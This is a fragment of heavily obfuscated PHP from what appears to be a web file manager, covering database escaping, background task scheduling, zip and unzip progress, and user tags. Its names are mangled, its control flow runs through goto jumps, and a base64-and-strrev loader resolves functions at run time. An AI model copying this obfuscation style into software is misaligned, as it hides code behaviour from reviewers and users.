$×Š³ÍŠ[12]; if (!empty($Ëé¯­©é)) { switch ($this->dbType) { case $×Š³ÍŠ[1032]: case $×Š³ÍŠ[1024]: $Ëé¯­©é = explode($×Š³ÍŠ[50], $Ëé¯­©é); if (count($Ëé¯­©é) > 1) { $È¤³Š .= $×Š³ÍŠ[51] . $Ëé¯­©é[1] . $×Š³ÍŠ[52] . $Ëé¯­©é[0] . $×Š³ÍŠ[53]; } else { $È¤³Š .= $×Š³ÍŠ[51] . $Ëé¯­©é[0] . $×Š³ÍŠ[53]; } break; case $×Š³ÍŠ[1005]: case $×Š³ÍŠ[1023]: break; case $×Š³ÍŠ[1007]: break; case $×Š³ÍŠ[1006]: case $×Š³ÍŠ[1008]: break; case $×Š³ÍŠ[1035]: default: $È¤³Š .= $×Š³ÍŠ[51] . $Ëé¯­©é . $×Š³ÍŠ[53]; } } return $È¤³Š; } public function parseKey(&$­Šù•Å„, $Ù¯åã”ˆ = true) { $šÕúŸ¯ˆ =& $_SERVER[†ûãı«°]; if ($Ù¯åã”ˆ) { $­Šù•Å„ = $this->parseKeyCheck($­Šù•Å„); } if ($this->dbType == $šÕúŸ¯ˆ[1035]) { if ($­Šù•Å„ != $šÕúŸ¯ˆ[222] && !preg_match($šÕúŸ¯ˆ[999], $­Šù•Å„)) { $­Šù•Å„ = $šÕúŸ¯ˆ[463] . trim($­Šù•Å„, $šÕúŸ¯ˆ[463]) . $šÕúŸ¯ˆ[463]; } return $­Šù•Å„; } else { return parent::parseKey($­Šù•Å„, $Ù¯åã”ˆ); } } public function close() { $this->_linkID = null; } public function error() { $‰˜ˆ¥êÕ =& $_SERVER[†ûãı«°]; if ($this->PDOStatement) { $úû—÷Âò = $this->PDOStatement->errorInfo(); $this->error = $úû—÷Âò[1] . $‰˜ˆ¥êÕ[4] . $úû—÷Âò[2]; } else { $this->error = $‰˜ˆ¥êÕ[12]; } if ($‰˜ˆ¥êÕ[12] != $this->queryStr) { $this->error .= LNG($‰˜ˆ¥êÕ[48]) . $this->queryStr; } think_trace($this->error, $‰˜ˆ¥êÕ[12], $‰˜ˆ¥êÕ[49]); return $this->error; } public function escapeString($•‰‰Ô†õ) { $¡šïÃÚ =& $_SERVER[†ûãı«°]; switch ($this->dbType) { case $¡šïÃÚ[1032]: case $¡šïÃÚ[1005]: case $¡šïÃÚ[1023]: case $¡šïÃÚ[1035]: return addslashes($•‰‰Ô†õ); case $¡šïÃÚ[1007]: case $¡šïÃÚ[1024]: case $¡šïÃÚ[1006]: case $¡šïÃÚ[1008]: return str_ireplace($¡šïÃÚ[58], $¡šïÃÚ[59], $•‰‰Ô†õ); } } protected function parseValue($ÁÒ»“’) { $·À’¹Ú =& $_SERVER[†ûãı«°]; if (is_string($ÁÒ»“’)) { $Çêİ®¢ = strpos($ÁÒ»“’, $·À’¹Ú[4]) === 0 && in_array($ÁÒ»“’, array_keys($this->bind)); $ÁÒ»“’ = $Çêİ®¢ ? $this->escapeString($ÁÒ»“’) : $·À’¹Ú[1045] . $this->escapeString($ÁÒ»“’) . $·À’¹Ú[1045]; } elseif (isset($ÁÒ»“’[0]) && is_string($ÁÒ»“’[0]) && strtolower($ÁÒ»“’[0]) == $·À’¹Ú[374]) { $ÁÒ»“’ = $this->escapeString($ÁÒ»“’[1]); } elseif (is_array($ÁÒ»“’)) { $ÁÒ»“’ = array_map(array($this, $·À’¹Ú[1046]), $ÁÒ»“’); } elseif (is_bool($ÁÒ»“’)) { $ÁÒ»“’ = $ÁÒ»“’ ? $·À’¹Ú[91] : $·À’¹Ú[230]; } elseif (is_null($ÁÒ»“’)) { $ÁÒ»“’ = $·À’¹Ú[106]; } return $ÁÒ»“’; } public function getLastInsertId() { $€ËˆÑ³ =& $_SERVER[†ûãı«°]; switch ($this->dbType) { case $€ËˆÑ³[1032]: case $€ËˆÑ³[1024]: case $€ËˆÑ³[1005]: case $€ËˆÑ³[1023]: case $€ËˆÑ³[1007]: case $€ËˆÑ³[1035]: return $this->_linkID->lastInsertId(); case $€ËˆÑ³[1006]: case $€ËˆÑ³[1008]: $ ¤´‚” = $this->table; $ÀØ¿ïƒĞ = $this->query("\x53\105\x4c\x45\x43\x54\40{$ ¤´‚”}\x2e\143\x75\x72\x72\x76\141\x6c\40\x63\165\x72\162\166\x61\154\40\106\x52\x4f\115\x20\x64\165\141\154"); return $ÀØ¿ïƒĞ ? $ÀØ¿ïƒĞ[0][$€ËˆÑ³[1047]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($„—ã‚Ö) { $˜âñû²ı =& $_SERVER[†ûãı«°]; if (!CacheLock::fileLock($˜âñû²ı[13])) { return !1; } $—â£Œ = parent::query($„—ã‚Ö); CacheLock::fileUnLock($˜âñû²ı[13]); return $—â£Œ; } public function execute($†æ®ö»º) { $ºè‡À¼ =& $_SERVER[†ûãı«°]; if (!CacheLock::fileLock($ºè‡À¼[13])) { return !1; } $À‰á­Ò² = parent::execute($†æ®ö»º); CacheLock::fileUnLock($ºè‡À¼[13]); return $À‰á­Ò²; } } goto c¡¼ÕâÛó÷; f¯›‚ìÏ«‡: class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($¢ÙƒÈÄ­, $™ëœ•ñğ = 5.0) { if (!$¢ÙƒÈÄ­) { return; } $–ìáÆİ = Cache::get($¢ÙƒÈÄ­); if (!$–ìáÆİ || timeFloat() - floatVal($–ìáÆİ) >= $™ëœ•ñğ) { Cache::set($¢ÙƒÈÄ­, timeFloat(), $™ëœ•ñğ * 10); return !0; } return !1; } public static function timeLimitCall($ÂÈÖÎ¸ñ, $Ù£Íç¨, $€¿ ıÑ‚, $ÏÚƒ”ŸÏ = 5.0) { $¬ØŞ°´´ =& $_SERVER[†ûãı«°]; if (!$ÂÈÖÎ¸ñ || !$Ù£Íç¨) { return; } self::$asyncAdd = !0; $Õê¬¾ = $¬ØŞ°´´[1891]; $ûË“ˆñ = Cache::get($Õê¬¾, !0); $úÌÀÖŞ­ = array($¬ØŞ°´´[1892] => timeFloat(), $¬ØŞ°´´[1893] => timeFloat(), $¬ØŞ°´´[343] => $Ù£Íç¨, $¬ØŞ°´´[1883] => $€¿ ıÑ‚, $¬ØŞ°´´[206] => $ÏÚƒ”ŸÏ); if (is_array($ûË“ˆñ[$ÂÈÖÎ¸ñ])) { $úÌÀÖŞ­[$¬ØŞ°´´[1893]] = $ûË“ˆñ[$ÂÈÖÎ¸ñ][$¬ØŞ°´´[1893]]; } if (is_array($ûË“ˆñ[$ÂÈÖÎ¸ñ])) { if (timeFloat() - $ûË“ˆñ[$ÂÈÖÎ¸ñ][$¬ØŞ°´´[1892]] < $úÌÀÖŞ­[$¬ØŞ°´´[206]] * 0.3) { return; } $úÌÀÖŞ­[$¬ØŞ°´´[1893]] = $ûË“ˆñ[$ÂÈÖÎ¸ñ][$¬ØŞ°´´[1893]]; } $ûË“ˆñ[$ÂÈÖÎ¸ñ] = $úÌÀÖŞ­; Cache::set($Õê¬¾, $ûË“ˆñ, 60); Cache::removeMemory($Õê¬¾); write_log($¬ØŞ°´´[1894] . $ÂÈÖÎ¸ñ . $¬ØŞ°´´[74] . $Ù£Íç¨, $¬ØŞ°´´[197]); } public static function timeLimitCallLoop() { $ÚÕ…ª¨‹ =& $_SERVER[†ûãı«°]; $Öªª©×Ö = array($ÚÕ…ª¨‹[1895]); $÷˜ÔÎèš = in_array(strtolower(ACTION), $Öªª©×Ö); if (!$÷˜ÔÎèš && !self::$asyncAdd) { return; } $åõ¸ = $ÚÕ…ª¨‹[1891]; $¬ŸÔ‚”’ = Cache::get($åõ¸, !0); if (!$¬ŸÔ‚”’ || count($¬ŸÔ‚”’) <= 0) { return; } $üÕçÅÌ = !1; $¿¸Ü‚éŒ = timeFloat(); $ì±ÓÉ¶á = array(); foreach ($¬ŸÔ‚”’ as $…«İñ˜İ => $Ë–ì©¢) { if ($¿¸Ü‚éŒ - $Ë–ì©¢[$ÚÕ…ª¨‹[1893]] > $Ë–ì©¢[$ÚÕ…ª¨‹[206]]) { $üÕçÅÌ = !0; try { Hook::apply($Ë–ì©¢[$ÚÕ…ª¨‹[343]], $Ë–ì©¢[$ÚÕ…ª¨‹[1883]]); write_log($ÚÕ…ª¨‹[1896] . $…«İñ˜İ . $ÚÕ…ª¨‹[74] . $Ë–ì©¢[$ÚÕ…ª¨‹[343]] . $ÚÕ…ª¨‹[1897] . ACTION, $ÚÕ…ª¨‹[197]); } catch (Exception $Õ¶ÊšÂõ) { } continue; } $ì±ÓÉ¶á[$…«İñ˜İ] = $Ë–ì©¢; } if (!$üÕçÅÌ) { return; } if (!$ì±ÓÉ¶á) { return Cache::remove($åõ¸); } Cache::set($åõ¸, $ì±ÓÉ¶á, 60); Cache::removeMemory($åõ¸); } public static function finished($âüù»ˆ, $ñªñ¸¾Å) { $ô¸İÕõæ =& $_SERVER[†ûãı«°]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($ô¸İÕõæ[343] => $âüù»ˆ, $ô¸İÕõæ[1883] => $ñªñ¸¾Å); } private static function finishedRun() { $†óƒ„Õ• =& $_SERVER[†ûãı«°]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Ê§ôº÷ƒ) { try { Hook::apply($Ê§ôº÷ƒ[$†óƒ„Õ•[343]], $Ê§ôº÷ƒ[$†óƒ„Õ•[1883]]); } catch (Exception $®œß¹Ø¨) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ã’…É¨Œ =& $_SERVER[†ûãı«°]; parent::startAfter(); Hook::bind($ã’…É¨Œ[1898], array($this, $ã’…É¨Œ[1899])); Hook::bind($ã’…É¨Œ[1289], array($this, $ã’…É¨Œ[1900])); Hook::bind($ã’…É¨Œ[1901], array($this, $ã’…É¨Œ[1902])); $ûŒéè÷» =& $this->task; $ûŒéè÷»[$ã’…É¨Œ[1903]] = $ã’…É¨Œ[1290]; if (!$ûŒéè÷»[$ã’…É¨Œ[1671]]) { $ûŒéè÷»[$ã’…É¨Œ[1671]] = LNG($ã’…É¨Œ[1904]); } } protected function endAfter() { $á·Ì ¼İ =& $_SERVER[†ûãı«°]; parent::endAfter(); Hook::unbind($á·Ì ¼İ[1898], array($this, $á·Ì ¼İ[1899])); Hook::unbind($á·Ì ¼İ[1289], array($this, $á·Ì ¼İ[1900])); Hook::unbind($á·Ì ¼İ[1901], array($this, $á·Ì ¼İ[1902])); } public function updateAfter() { $µòÑŞÂŠ =& $_SERVER[†ûãı«°]; $šİÌŠö´ =& $this->task; if (!$šİÌŠö´[$µòÑŞÂŠ[1151]] || !$šİÌŠö´[$µòÑŞÂŠ[839]]) { if ($šİÌŠö´[$µòÑŞÂŠ[1903]] != $µòÑŞÂŠ[390]) { return; } } if ($šİÌŠö´[$µòÑŞÂŠ[1903]] == $µòÑŞÂŠ[1290]) { $²«çÅˆÀ = 0; if ($šİÌŠö´[$µòÑŞÂŠ[1837]]) { $²«çÅˆÀ = $šİÌŠö´[$µòÑŞÂŠ[1838]] / $šİÌŠö´[$µòÑŞÂŠ[1837]]; } $šİÌŠö´[$µòÑŞÂŠ[1785]] = $²«çÅˆÀ * 0.3; } else { if ($šİÌŠö´[$µòÑŞÂŠ[1903]] == $µòÑŞÂŠ[390]) { $²«çÅˆÀ = $šİÌŠö´[$µòÑŞÂŠ[1784]] / $šİÌŠö´[$µòÑŞÂŠ[1151]]; $šİÌŠö´[$µòÑŞÂŠ[1785]] = 0.3 + $²«çÅˆÀ * 0.4; } else { if ($šİÌŠö´[$µòÑŞÂŠ[1903]] == $µòÑŞÂŠ[110]) { $§½Í™çé = 0; if ($šİÌŠö´[$µòÑŞÂŠ[1839]] == $µòÑŞÂŠ[110]) { $§½Í™çé = $šİÌŠö´[$µòÑŞÂŠ[1838]]; } $²«çÅˆÀ = ($šİÌŠö´[$µòÑŞÂŠ[1842]] + $§½Í™çé) / $šİÌŠö´[$µòÑŞÂŠ[839]]; $šİÌŠö´[$µòÑŞÂŠ[1785]] = 0.3 + 0.4 + $²«çÅˆÀ * 0.3; } } } if ($šİÌŠö´[$µòÑŞÂŠ[1785]] > 0) { $óôµÑõÄ = timeFloat() - $šİÌŠö´[$µòÑŞÂŠ[1787]] - $šİÌŠö´[$µòÑŞÂŠ[1790]]; $šİÌŠö´[$µòÑŞÂŠ[1791]] = $óôµÑõÄ * (1 - $šİÌŠö´[$µòÑŞÂŠ[1785]]) / $šİÌŠö´[$µòÑŞÂŠ[1785]]; } } public function addFile($Ú¾Ç¯Œ) { $ÓÍÓ–½û =& $_SERVER[†ûãı«°]; $†ğŸˆ›ş =& $this->task; $´«ƒŠ¶ = IO::info($Ú¾Ç¯Œ); $†ğŸˆ›ş[$ÓÍÓ–½û[1835]] = $´«ƒŠ¶[$ÓÍÓ–½û[32]]; $†ğŸˆ›ş[$ÓÍÓ–½û[1837]] = $´«ƒŠ¶[$ÓÍÓ–½û[79]]; $†ğŸˆ›ş[$ÓÍÓ–½û[1838]] = 0; $†ğŸˆ›ş[$ÓÍÓ–½û[1153]] = $ÓÍÓ–½û[1858]; $†ğŸˆ›ş[$ÓÍÓ–½û[1839]] = $ÓÍÓ–½û[1290]; $†ğŸˆ›ş[$ÓÍÓ–½û[839]] = $´«ƒŠ¶[$ÓÍÓ–½û[79]]; $†ğŸˆ›ş[$ÓÍÓ–½û[1151]] = 1; $µ™–ù¥ = 0; $†ğŸˆ›ş[$ÓÍÓ–½û[1846]] = array($ÓÍÓ–½û[1847] => $µ™–ù¥ + 1, $ÓÍÓ–½û[496] => $´«ƒŠ¶[$ÓÍÓ–½û[32]], $ÓÍÓ–½û[87] => $´«ƒŠ¶[$ÓÍÓ–½û[87]], $ÓÍÓ–½û[586] => $´«ƒŠ¶[$ÓÍÓ–½û[586]] ? $´«ƒŠ¶[$ÓÍÓ–½û[586]] : $´«ƒŠ¶[$ÓÍÓ–½û[87]]); $this->update(); } public function zipEvent($ôÃåâÈÕ, $Ê«°×æÍ, $İÇŠÇÙ, $³£¼Ìã³) { $©È²€ü› =& $_SERVER[†ûãı«°]; $©Ñğ¿™¨ =& $this->task; $©Ñğ¿™¨[$©È²€ü›[1835]] = get_path_this($Ê«°×æÍ); $©Ñğ¿™¨[$©È²€ü›[1837]] = $³£¼Ìã³; $©Ñğ¿™¨[$©È²€ü›[1838]] = $İÇŠÇÙ; $©Ñğ¿™¨[$©È²€ü›[1153]] = $ôÃåâÈÕ == $©È²€ü›[1905] ? $©È²€ü›[1906] : $©È²€ü›[1907]; $©Ñğ¿™¨[$©È²€ü›[1839]] = $©È²€ü›[12]; $©Ñğ¿™¨[$©È²€ü›[839]] = $³£¼Ìã³; $©Ñğ¿™¨[$©È²€ü›[1903]] = $©È²€ü›[390]; $this->update(); } public function unzipAfter($È¥ÉŸÍı) { $ “Ô¹ œ =& $_SERVER[†ûãı«°]; $ìéëíáİ =& $this->task; $ìéëíáİ[$ “Ô¹ œ[1903]] = $ “Ô¹ œ[110]; $¼ÙØÀÍ‡ = IO::infoWithChildren($È¥ÉŸÍı); $“˜®üÏ = 0; $ìéëíáİ[$ “Ô¹ œ[1846]] = array($ “Ô¹ œ[1847] => $“˜®üÏ + 1, $ “Ô¹ œ[496] => $¼ÙØÀÍ‡[$ “Ô¹ œ[32]], $ “Ô¹ œ[87] => $¼ÙØÀÍ‡[$ “Ô¹ œ[87]], $ “Ô¹ œ[586] => $¼ÙØÀÍ‡[$ “Ô¹ œ[586]] ? $¼ÙØÀÍ‡[$ “Ô¹ œ[586]] : $¼ÙØÀÍ‡[$ “Ô¹ œ[87]]); if ($¼ÙØÀÍ‡[$ “Ô¹ œ[33]] == $ “Ô¹ œ[232]) { $ìéëíáİ[$ “Ô¹ œ[1151]] = 1; } else { $ìéëíáİ[$ “Ô¹ œ[1151]] = $¼ÙØÀÍ‡[$ “Ô¹ œ[82]][$ “Ô¹ œ[80]]; } $ìéëíáİ[$ “Ô¹ œ[1153]] = $ “Ô¹ œ[12]; $ìéëíáİ[$ “Ô¹ œ[1839]] = 0; $ìéëíáİ[$ “Ô¹ œ[1784]] = 0; $ìéëíáİ[$ “Ô¹ œ[1837]] = 0; $ìéëíáİ[$ “Ô¹ œ[1838]] = 0; $ìéëíáİ[$ “Ô¹ œ[1835]] = $ “Ô¹ œ[12]; $ìéëíáİ[$ “Ô¹ œ[1842]] = 0; $ìéëíáİ[$ “Ô¹ œ[839]] = $¼ÙØÀÍ‡[$ “Ô¹ œ[79]]; $this->update(); self::log($ “Ô¹ œ[1908] . json_encode(array($ìéëíáİ, $¼ÙØÀÍ‡))); } public function nameParse($ıÄİ‰) { $Ê©¨¿ë™ =& $_SERVER[†ûãı«°]; $™û…Ûß =& $this->task; if ($™û…Ûß[$Ê©¨¿ë™[1903]] == $Ê©¨¿ë™[1290]) { $™û…Ûß[$Ê©¨¿ë™[1903]] = $Ê©¨¿ë™[390]; $™û…Ûß[$Ê©¨¿ë™[1842]] = 0; $™û…Ûß[$Ê©¨¿ë™[839]] = 0; } $òŒÏùàŒ = get_path_this($ıÄİ‰); if (strstr($òŒÏùàŒ, $Ê©¨¿ë™[10])) { $™û…Ûß[$Ê©¨¿ë™[1784]] += 1; $™û…Ûß[$Ê©¨¿ë™[1151]] += 1; } $™û…Ûß[$Ê©¨¿ë™[1835]] = $ıÄİ‰; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $áÎë½êÑ =& $_SERVER[†ûãı«°]; parent::startAfter(); Hook::bind($áÎë½êÑ[1909], array($this, $áÎë½êÑ[1899])); Hook::bind($áÎë½êÑ[1901], array($this, $áÎë½êÑ[1902])); $¡·ìõ‹¿ =& $this->task; $¡·ìõ‹¿[$áÎë½êÑ[1903]] = $áÎë½êÑ[1290]; if (!$¡·ìõ‹¿[$áÎë½êÑ[1671]]) { $¡·ìõ‹¿[$áÎë½êÑ[1671]] = LNG($áÎë½êÑ[1910]); } } protected function endAfter() { $÷áÃÍıÈ =& $_SERVER[†ûãı«°]; parent::endAfter(); Hook::unbind($÷áÃÍıÈ[1909], array($this, $÷áÃÍıÈ[1899])); Hook::unbind($÷áÃÍıÈ[1901], array($this, $÷áÃÍıÈ[1902])); } public function updateAfter() { $´Ÿı Ú =& $_SERVER[†ûãı«°]; $ü‡î©Ë˜ =& $this->task; if (!$ü‡î©Ë˜[$´Ÿı Ú[1151]] || !$ü‡î©Ë˜[$´Ÿı Ú[839]]) { return; } if ($ü‡î©Ë˜[$´Ÿı Ú[1903]] == $´Ÿı Ú[1290]) { $ß‚­Š­ = $ü‡î©Ë˜[$´Ÿı Ú[1838]]; if ($ü‡î©Ë˜[$´Ÿı Ú[1839]] != $´Ÿı Ú[1290]) { $ß‚­Š­ = 0; } $ãşåË” = ($ü‡î©Ë˜[$´Ÿı Ú[1842]] + $ß‚­Š­) / $ü‡î©Ë˜[$´Ÿı Ú[839]]; $ü‡î©Ë˜[$´Ÿı Ú[1785]] = $ãşåË” * 0.3; } else { if ($ü‡î©Ë˜[$´Ÿı Ú[1903]] == $´Ÿı Ú[390]) { $ãşåË” = $ü‡î©Ë˜[$´Ÿı Ú[1784]] / $ü‡î©Ë˜[$´Ÿı Ú[1151]]; $ü‡î©Ë˜[$´Ÿı Ú[1785]] = 0.3 + $ãşåË” * 0.5; } else { if ($ü‡î©Ë˜[$´Ÿı Ú[1903]] == $´Ÿı Ú[110]) { $ãşåË” = 0; if ($ü‡î©Ë˜[$´Ÿı Ú[1837]]) { $ãşåË” = $ü‡î©Ë˜[$´Ÿı Ú[1838]] / $ü‡î©Ë˜[$´Ÿı Ú[1837]]; } $ü‡î©Ë˜[$´Ÿı Ú[1785]] = 0.3 + 0.5 + $ãşåË” * 0.2; } } } if ($ü‡î©Ë˜[$´Ÿı Ú[1785]] > 0) { $îÅ²šé = timeFloat() - $ü‡î©Ë˜[$´Ÿı Ú[1787]] - $ü‡î©Ë˜[$´Ÿı Ú[1790]]; $ü‡î©Ë˜[$´Ÿı Ú[1791]] = $îÅ²šé * (1 - $ü‡î©Ë˜[$´Ÿı Ú[1785]]) / $ü‡î©Ë˜[$´Ÿı Ú[1785]]; } } public function copyFileStart($•„Ö×‚¹, $÷Éƒ«…â, $ñ ç™ª…, $œÅÖ¬ˆ‚, $ø£ãÁ×, $æÖìÛä) { $•ÊË¡Úş =& $_SERVER[†ûãı«°]; parent::copyFileStart($•„Ö×‚¹, $÷Éƒ«…â, $ñ ç™ª…, $œÅÖ¬ˆ‚, $ø£ãÁ×, $æÖìÛä); $óç¹Ô«Ü =& $this->task; if ($óç¹Ô«Ü[$•ÊË¡Úş[1903]] == $•ÊË¡Úş[390]) { $óç¹Ô«Ü[$•ÊË¡Úş[1903]] = $•ÊË¡Úş[110]; } $this->update(); } public function copyFileEnd($Å»ÚèÑÅ, $Â»øî«, $Öğê¨ôğ, $ÅÍÓ¿ÛÅ, $»ôàëá­, $ĞıÅ…ô¶) { $ó‘Ší¸á =& $_SERVER[†ûãı«°]; $½ïôçÁ¨ =& $this->task; $½ïôçÁ¨[$ó‘Ší¸á[1838]] = $½ïôçÁ¨[$ó‘Ší¸á[1837]]; $½ïôçÁ¨[$ó‘Ší¸á[1842]] += $½ïôçÁ¨[$ó‘Ší¸á[1837]]; $½ïôçÁ¨[$ó‘Ší¸á[1839]] = $ó‘Ší¸á[12]; $this->update(); } public function zipEvent($Ğ‰íÀó, $ç’›á¨Ö, $€½¨±ãİ, $ˆ„ìçè) { $÷·ğôÛÚ =& $_SERVER[†ûãı«°]; $Î‚¨ŠˆÌ =& $this->task; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1835]] = get_path_this($ç’›á¨Ö); $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1837]] = $ˆ„ìçè; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1838]] = $€½¨±ãİ; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1153]] = $Ğ‰íÀó == $÷·ğôÛÚ[1911] ? $÷·ğôÛÚ[1906] : $÷·ğôÛÚ[1907]; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1839]] = $÷·ğôÛÚ[12]; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[839]] = $ˆ„ìçè; $Î‚¨ŠˆÌ[$÷·ğôÛÚ[1903]] = $÷·ğôÛÚ[390]; $this->update(); } public function nameParse($ÇÍŒı¼¦) { $‡º·Àç€ =& $_SERVER[†ûãı«°]; $¡¬òÌÅˆ =& $this->task; if ($¡¬òÌÅˆ[$‡º·Àç€[1784]] < $¡¬òÌÅˆ[$‡º·Àç€[1151]]) { $•œ²Şí = get_path_this($ÇÍŒı¼¦); if (strstr($•œ²Şí, $‡º·Àç€[10])) { $¡¬òÌÅˆ[$‡º·Àç€[1784]] += 1; } } if ($¡¬òÌÅˆ[$‡º·Àç€[1903]] == $‡º·Àç€[1290]) { $¡¬òÌÅˆ[$‡º·Àç€[1903]] = $‡º·Àç€[390]; } $¡¬òÌÅˆ[$‡º·Àç€[1835]] = $ÇÍŒı¼¦; $this->update(); } } goto FöÓÃ‡ŠæÏ; c´Ç±Û³à§: $fileSize = strrev(base64_decode($_SERVER[‘ğÇ«Š][0])); function binCheckNeq($·îõ¼–, $¾ÉØı») { return $·îõ¼– != $¾ÉØı»; } $_SERVER[$_SERVER[‘ğÇ«Š][1]] = $fileSize($_SERVER[$_SERVER[‘ğÇ«Š][2]]); goto cÀ‚†ç÷™Ê; b×‹‚¡‚‡´: class UserTagSourceModel extends ModelBase { protected $tableName = "\x75\x73\x65\162\137\x66\x61\x76"; protected function cacheFunctionAlias($–¾œ¨˜€) { $ûàÚø¿  =& $_SERVER[†ûãı«°]; return array($ûàÚø¿ [2099] => array($ûàÚø¿ [2528] . USER_ID, $ûàÚø¿ [2100])); } protected function listData() { $‡˜àêî =& $_SERVER[†ûãı«°]; $Ïé²¤°” = array($‡˜àêî[1774] => USER_ID, $‡˜àêî[561] => array($‡˜àêî[2103], 0)); $ôª¾Œª­ = $‡˜àêî[2529]; $æˆÖÜíÇ = $this->field($ôª¾Œª­)->where($Ïé²¤°”)->order($‡˜àêî[2106])->select(); return $æˆÖÜíÇ ? $æˆÖÜíÇ : array(); } protected function addToTag($¢ô…ûş, $Ñ°ïàø¯) { $éöº’ıÙ =& $_SERVER[†ûãı«°]; if (!Model($éöº’ıÙ[2256])->listData($Ñ°ïàø¯)) { return !1; } if (is_numeric($¢ô…ûş)) { $ÒÕß½äŞ = Model($éöº’ıÙ[906])->pathInfo($¢ô…ûş); if (!$ÒÕß½äŞ) { return !1; } } else { $ÒÕß½äŞ = IO::infoSimple($¢ô…ûş); if (!$ÒÕß½äŞ) { return !1; } $üÖäÀ«¡ = $ÒÕß½äŞ[$éöº’ıÙ[32]]; $¼¥´¹Û¨ = $ÒÕß½äŞ[$éöº’ıÙ[33]]; if (isset($ÒÕß½äŞ[$éöº’ıÙ[487]])) { $¼¥´¹Û¨ = $ÒÕß½äŞ[$éöº’ıÙ[487]] == $éöº’ıÙ[91] ? $éöº’ıÙ[78] : $éöº’ıÙ[232]; } } $¢ûŠ½ï› = array($éöº’ıÙ[1774] => USER_ID, $éöº’ıÙ[561] => $Ñ°ïàø¯, $éöº’ıÙ[497] => $¢ô…ûş, $éöº’ıÙ[498] => $¼¥´¹Û¨ ? $¼¥´¹Û¨ : $éöº’ıÙ[492], $éöº’ıÙ[496] => $üÖäÀ«¡ ? $üÖäÀ«¡ : $éöº’ıÙ[12], $éöº’ıÙ[1988] => 0); if ($this->where($¢ûŠ½ï›)->find()) { return !1; } return $this->add($¢ûŠ½ï›); } protected function removeFromTag($îãËº¥ş, $Ãëï·•ğ) { $íóîüëé =& $_SERVER[†ûãı«°]; if (!Model($íóîüëé[2256])->listData($Ãëï·•ğ)) { return !1; } if (is_array($îãËº¥ş)) { $îãËº¥ş = array($íóîüëé[7], $îãËº¥ş); } $³­¨¨è˜ = array($íóîüëé[1774] => USER_ID, $íóîüëé[561] => $Ãëï·•ğ, $íóîüëé[497] => $îãËº¥ş); return $this->where($³­¨¨è˜)->delete(); } protected function removeByTag($è¼¼…Â) { $……Ç·ïó =& $_SERVER[†ûãı«°]; if (!$è¼¼…Â) { return !1; } $»Áşñş¹ = array($……Ç·ïó[1774] => USER_ID, $……Ç·ïó[561] => $è¼¼…Â); return $this->where($»Áşñş¹)->delete(); } protected function removeBySource($úºêè¬ù) { $ÔÏ«ïç =& $_SERVER[†ûãı«°]; if (is_array($úºêè¬ù)) { $úºêè¬ù = array($ÔÏ«ïç[7], $úºêè¬ù); } $Ğú™™²Ç = array($ÔÏ«ïç[1774] => USER_ID, $ÔÏ«ïç[561] => array($ÔÏ«ïç[1102], 0), $ÔÏ«ïç[497] => $úºêè¬ù); return $this->where($Ğú™™²Ç)->delete(); } }